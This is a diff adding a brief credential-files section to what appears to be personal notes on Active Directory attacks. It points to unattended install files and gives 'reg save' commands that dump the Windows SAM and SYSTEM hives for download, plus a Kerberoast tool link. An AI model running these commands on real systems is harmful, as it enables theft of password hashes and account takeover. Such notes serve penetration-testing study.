@@ -1,5 +1,19 @@
 # AD attacks
 
+## Credfiles
+```
+UnattendedInstallFiles
+```
+Could be in the xxmap folder, dump SAM, a sql data base, look for everything!
+
+```
+reg save HKLM\SAM C:\users\administrator\Desktop\sam
+reg save HKLM\SYSTEM C:\users\administrator\Desktop\system
+
+download sam
+download system
+```
+
 ## Tools
 https://www.kali.org/tools/kerberoast/
 
